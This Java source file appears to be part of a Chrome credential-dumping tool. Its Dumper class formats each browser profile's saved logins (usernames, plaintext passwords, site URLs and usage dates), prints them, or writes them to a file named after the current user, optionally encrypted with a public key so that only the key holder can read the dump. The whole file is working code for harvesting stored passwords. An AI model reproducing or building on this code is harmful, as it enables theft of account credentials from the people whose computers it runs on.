package random.util;

import random.chrome.ChromeAccountEntry;

import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Map;

public class Dumper {

    public void saveAccountsInfoToFile(Map<String, List<ChromeAccountEntry>> profiles,
                                       String newFiePath, String pubKeyPath) throws IOException {

        final List<String> lines = getAccountsInfo(profiles, false);

        String savePath = newFiePath != null && !newFiePath.equals("") ? newFiePath : ".";
        File file = new File(savePath + System.getProperty("file.separator"),
                Utils.getCurrentTime() + "-" + System.getProperty("user.name") + ".txt");

        if (file.exists()) {
            file.delete();
        }
        file.getParentFile().mkdirs();
        file.createNewFile();

        if (pubKeyPath != null && !pubKeyPath.isEmpty()) {
            String encoded = Encryption.encrypt(pubKeyPath, lines.toString());
            Files.write(file.toPath(), Collections.singletonList(encoded), StandardCharsets.UTF_8);
        } else {
            Files.write(file.toPath(), lines, StandardCharsets.UTF_8);
        }
    }

    public void showAccountsInfo(Map<String, List<ChromeAccountEntry>> profiles) {
        List<String> lines = getAccountsInfo(profiles, true);
        lines.forEach(System.out::println);
    }

    public List<String> getAccountsInfo(Map<String, List<ChromeAccountEntry>> profiles, boolean onlyWithNotEmptyPsw) {
        final List<String> lines = new ArrayList<>();

        for (Map.Entry<String, List<ChromeAccountEntry>> profile : profiles.entrySet()) {
            String profileName = profile.getKey();
            lines.add("==================================================");
            lines.add(profileName);
            lines.add("==================================================");
            List<ChromeAccountEntry> profileEntries = profile.getValue();
            if (profileEntries.size() > 0) {
                for (final ChromeAccountEntry account : profileEntries) {
                    boolean returnInfo = onlyWithNotEmptyPsw
                            ? !account.password().equals("")
                            : !account.actionUrl().equals("") || !account.usernameValue().equals("") || !account.password().equals("");
                    if (returnInfo) {
                        lines.add("Username value:\t\t" + account.usernameValue());
                        lines.add("Username element:\t" + account.usernameElement());
                        lines.add("Display name:\t" + account.displayName());
                        lines.add("Password:\t\t" + account.password());
                        lines.add("Action URL:\t\t" + account.actionUrl());
                        lines.add("Origin URL:\t\t" + account.originUrl());
                        lines.add("date_created:\t\t" + account.dateCreated());
                        lines.add("date_last_used:\t\t" + account.dateLastUsed());
                        lines.add("date_password_modified:\t" + account.datePasswordModified());
                        lines.add("Times used:\t\t" + account.timesUsed());
                        lines.add("");
                    }
                }
                lines.remove(lines.size() - 1);
            }
        }
        return lines;
    }
}
